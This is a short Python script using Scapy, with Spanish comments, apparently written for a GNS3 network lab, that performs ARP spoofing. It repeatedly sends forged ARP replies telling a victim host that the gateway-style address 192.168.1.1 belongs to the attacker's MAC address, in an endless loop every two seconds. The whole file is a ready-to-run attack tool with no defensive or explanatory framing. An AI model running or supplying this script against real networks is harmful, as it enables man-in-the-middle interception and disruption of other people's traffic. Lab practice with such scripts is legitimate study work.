from scapy.all import *
import time

# Configuración
INTERFACE = 'eth0'  # Cambia según tu interfaz en GNS3
TARGET_IP = '192.168.1.1'  # IP a falsificar (por ejemplo, PC1)
VICTIM_IP = '192.168.1.3'  # IP de la víctima (por ejemplo, PC3)
ATTACKER_MAC = '00:14:22:01:23:48'  # MAC del atacante (ajústala)

def spoof_arp():
    # Crear paquete ARP falsificado
    arp = ARP(op=2, psrc=TARGET_IP, pdst=VICTIM_IP, hwsrc=ATTACKER_MAC)
    while True:
        send(arp, verbose=False)
        print(f"Enviando ARP: {TARGET_IP} es {ATTACKER_MAC}")
        time.sleep(2)

if __name__ == '__main__':
    conf.iface = INTERFACE
    spoof_arp()
